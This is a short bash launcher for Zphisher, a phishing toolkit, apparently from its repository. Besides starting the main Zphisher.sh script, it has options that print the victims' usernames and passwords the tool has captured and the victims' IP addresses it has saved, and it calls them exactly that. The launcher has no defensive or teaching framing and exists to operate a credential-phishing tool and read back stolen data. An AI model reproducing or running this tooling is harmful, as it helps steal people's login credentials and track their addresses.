#!/bin/bash

# https://github.com/nn-tech/Zphisher

if [[ $(uname -o) == *'Android'* ]];then
	Zphisher_ROOT="/data/data/com.termux/files/usr/opt/Zphisher"
else
	export Zphisher_ROOT="/opt/Zphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Zphisher type \`Zphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $Zphisher_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $Zphisher_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $Zphisher_ROOT
	bash ./Zphisher.sh
fi
